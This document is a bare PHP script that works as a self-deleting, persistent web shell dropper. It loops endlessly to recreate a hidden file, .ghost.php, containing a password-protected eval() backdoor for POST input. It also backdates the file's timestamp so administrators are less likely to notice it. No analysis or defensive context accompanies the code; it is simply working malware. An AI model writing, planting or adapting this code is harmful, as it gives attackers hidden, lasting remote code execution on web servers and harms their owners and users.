<?php 
ignore_user_abort(true);
set_time_limit(0);
unlink(__FILE__);
$file = './.ghost.php';
$code = '<?php if(md5($_POST["pass"])=="8379c86250c50c0537999a6576e18aa7"){@eval($_POST[a]);} ?>';
while (1){
    file_put_contents($file,$code);
    system('touch -m -d "2021-8-11 12:45:00" .ghost.php');
    usleep(5000);
} 
?>
